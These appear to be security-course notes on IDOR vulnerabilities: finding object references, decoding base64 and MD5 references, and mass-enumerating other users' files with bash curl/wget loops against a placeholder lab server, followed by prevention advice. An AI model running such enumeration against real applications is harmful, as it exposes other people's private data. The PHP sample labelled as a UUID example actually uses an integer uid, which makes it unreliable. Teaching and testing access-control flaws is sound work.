`Insecure Direct Object References (IDOR)` vulnerabilities are among the most common web vulnerabilities and can significantly impact the vulnerable web application. IDOR vulnerabilities occur when a web application exposes a direct reference to an object, like a file or a database resource, which the end-user can directly control to obtain access to other similar objects. If any user can access any resource due to the lack of a solid access control system, the system is considered to be vulnerable.
Building a solid access control system is very challenging, which is why IDOR vulnerabilities are pervasive. In addition, automating the process of identifying weaknesses in access control systems is also quite difficult, which may lead to these vulnerabilities going unidentified until they reach production.
# Identifying IDORs
## URL Parameters & APIs
The very first step of exploiting IDOR vulnerabilities is identifying Direct Object References. Whenever we receive a specific file or resource, we should study the HTTP requests to look for URL parameters or APIs with an object reference (e.g. `?uid=1` or `?filename=file_1.pdf`). These are mostly found in URL parameters or APIs but may also be found in other HTTP headers, like cookies.
In the most basic cases, we can try incrementing the values of the object references to retrieve other data, like (`?uid=2`) or (`?filename=file_2.pdf`). We can also use a fuzzing application to try thousands of variations and see if they return any data. 
## AJAX Calls
We may also be able to identify unused parameters or APIs in the front-end code in the form of JavaScript AJAX calls. Some web applications developed in JavaScript frameworks may insecurely place all function calls on the front-end and use the appropriate ones based on the user role.
This is not unique to admin functions, of course, but can also be any functions or calls that may not be found through monitoring HTTP requests. The following example shows a basic example of an AJAX call:
```
function changeUserPassword() {
    $.ajax({
        url:"change_password.php",
        type: "post",
        dataType: "json",
        data: {uid: user.uid, password: user.password, is_admin: is_admin},
        success:function(result){
            //
        }
    });
}
```
The above function may never be called when we use the web application as a non-admin user. However, if we locate it in the front-end code, we may test it in different ways to see whether we can call it to perform changes, which would indicate that it is vulnerable to IDOR. We can do the same with back-end code if we have access to it (e.g., open-source web applications).

## Understand Hashing/Encoding
Some web applications may not use simple sequential numbers as object references but may encode the reference or hash it instead. Suppose the reference was encoded with a common encoder (e.g. `base64`). In that case, we could decode it and view the plaintext of the object reference, change its value, and then encode it again to access other data. For example, if we see a reference like (`?filename=ZmlsZV8xMjMucGRm`), we can immediately guess that the file name is `base64` encoded, which we can decode to get the original object reference of (`file_123.pdf`). Then, we can try encoding a different object reference (e.g. `file_124.pdf`) and try accessing it with the encoded object reference (`?filename=ZmlsZV8xMjQucGRm`), which may reveal an IDOR vulnerability if we were able to retrieve any data. 
On the other hand, the object reference may be hashed, like (`download.php?filename=c81e728d9d4c2f636f067f89cc14862c`). At a first glance, we may think that this is a secure object reference, as it is not using any clear text or easy encoding. However, if we look at the source code, we may see what is being hashed before the API call is made:
```
$.ajax({
    url:"download.php",
    type: "post",
    dataType: "json",
    data: {filename: CryptoJS.MD5('file_1.pdf').toString()},
    success:function(result){
        //
    }
});
```
## Compare User Roles
If we want to perform more advanced IDOR attacks, we may need to register multiple users and compare their HTTP requests and object references. This may allow us to understand how the URL parameters and unique identifiers are being calculated and then calculate them for other users to gather their data.

For example, if we had access to two different users, one of which can view their salary after making the following API call:
```
{
  "attributes" : 
    {
      "type" : "salary",
      "url" : "/services/data/salaries/users/1"
    },
  "Id" : "1",
  "Name" : "User1"

}
```

The second user may not have all of these API parameters to replicate the call and should not be able to make the same call as `User1`. However, with these details at hand, we can try repeating the same API call while logged in as `User2` to see if the web application returns anything. Such cases may work if the web application only requires a valid logged-in session to make the API call but has no access control on the back-end to compare the caller's session with the data being called.

If this is the case, and we can calculate the API parameters for other users, this would be an IDOR vulnerability. Even if we could not calculate the API parameters for other users, we would still have identified a vulnerability in the back-end access control system and may start looking for other object references to exploit.
# Mass IDOR Enumeration
## Insecure Parameters
This is a common mistake found in web applications suffering from IDOR vulnerabilities, as they place the parameter that controls which user documents to show under our control while having no access control system on the back-end. Another example is using a filter parameter to only display a specific user's documents (e.g. `uid_filter=1`), which can also be manipulated to show other users' documents or even completely removed to show all documents at once.
## Mass Enumeration
We can try manually accessing other employee documents with `uid=3`, `uid=4`, and so on. However, manually accessing files is not efficient in a real work environment with hundreds or thousands of employees. So, we can either use a tool like `Burp Intruder` or `ZAP Fuzzer` to retrieve all files or write a small bash script to download all files, which is what we will do.

As we can see, we were able to capture the document links successfully. We may now use specific bash commands to trim the extra parts and only get the document links in the output. However, it is a better practice to use a `Regex` pattern that matches strings between `/document` and `.pdf`, which we can use with `grep` to only get the document links, as follows:
```
MarcosV999@htb[/htb]$ curl -s "http://SERVER_IP:PORT/documents.php?uid=3" | grep -oP "\/documents.*?.pdf"

/documents/Invoice_3_06_2020.pdf
/documents/Report_3_01_2020.pdf
```
Now, we can use a simple `for` loop to loop over the `uid` parameter and return the document of all employees, and then use `wget` to download each document link:
```
#!/bin/bash

url="http://SERVER_IP:PORT"

for i in {1..10}; do
        for link in $(curl -s "$url/documents.php?uid=$i" | grep -oP "\/documents.*?.pdf"); do
                wget -q $url/$link
        done
done
```

# Bypassing Encoded References

```
function downloadContract(uid) {
    $.redirect("/download.php", {
        contract: CryptoJS.MD5(btoa(uid)).toString(),
    }, "POST", "_self");
}
```

```
MarcosV999@htb[/htb]$ echo -n 1 | base64 -w 0 | md5sum

cdd96d3cc73d1dbdaffa03cc6cd7339b -
```
**Tip:** We are using the `-n` flag with `echo`, and the `-w 0` flag with `base64`, to avoid adding newlines, in order to be able to calculate the `md5` hash of the same value, without hashing newlines, as that would change the final `md5` hash.
## Mass Enumeration
We can start by calculating the hash for each of the first ten employees using the same previous command while using `tr -d` to remove the trailing `-` characters, as follows:
```
MarcosV999@htb[/htb]$ for i in {1..10}; do echo -n $i | base64 -w 0 | md5sum | tr -d ' -'; done
```
Next, we can make a `POST` request on `download.php` with each of the above hashes as the `contract` value, which should give us our final script:
```
#!/bin/bash

for i in {1..10}; do
    for hash in $(echo -n $i | base64 -w 0 | md5sum | tr -d ' -'); do
        curl -sOJ -X POST -d "contract=$hash" http://SERVER_IP:PORT/download.php
    done
done
```

# IDOR Prevention
## Object-Level Access Control
User roles and permissions are a vital part of any access control system, which is fully realized in a Role-Based Access Control (RBAC) system. To avoid exploiting IDOR vulnerabilities, we must map the RBAC to all objects and resources. The back-end server can allow or deny every request, depending on whether the requester's role has enough privileges to access the object or the resource. Once an RBAC has been implemented, each user would be assigned a role that has certain privileges. Upon every request the user makes, their roles and privileges would be tested to see if they have access to the object they are requesting. They would only be allowed to access it if they have the right to do so.
There are many ways to implement an RBAC system and map it to the web application's objects and resources, and designing it in the core of the web application's structure is an art to perfect. The following is a sample code of how a web application may compare user roles to objects to allow or deny access control:
```
match /api/profile/{userId} {
    allow read, write: if user.isAuth == true
    && (user.uid == userId || user.roles == 'admin');
}
```
The above example uses the `user` token, which can be `mapped from the HTTP request made to the RBAC` to retrieve the user's various roles and privileges. Then, it only allows read/write access if the user's `uid` in the RBAC system matches the `uid` in the API endpoint they are requesting. Furthermore, if a user has `admin` as their role in the back-end RBAC, they are allowed read/write access.
## Object Referencing

While the core issue with IDOR lies in broken access control (`Insecure`), having access to direct references to objects (`Direct Object Referencing`) makes it possible to enumerate and exploit these access control vulnerabilities. We may still use direct references, but only if we have a solid access control system implemented.
Even after building a solid access control system, we should never use object references in clear text or simple patterns (e.g. `uid=1`). We should always use strong and unique references, like salted hashes or `UUID`'s. For example, we can use `UUID V4` to generate a strongly randomized id for any element, which looks something like (`89c9b29b-d19f-4515-b2dd-abb6e693eb20`). Then, we can map this `UUID` to the object it is referencing in the back-end database, and whenever this `UUID` is called, the back-end database would know which object to return. The following example PHP code shows us how this may work:
```
$uid = intval($_REQUEST['uid']);
$query = "SELECT url FROM documents where uid=" . $uid;
$result = mysqli_query($conn, $query);
$row = mysqli_fetch_array($result);
echo "<a href='" . $row['url'] . "' target='_blank'></a>";
```

Finally, we must note that using `UUID`s may let IDOR vulnerabilities go undetected since it makes it more challenging to test for IDOR vulnerabilities. This is why strong object referencing is always the second step after implementing a strong access control system. Furthermore, some of the techniques we learned in this module would work even with unique references if the access control system is broken, like repeating one user's request with another user's session, as we have previously seen.
If we implement both of these security mechanisms, we should be relatively safe against IDOR vulnerabilities.
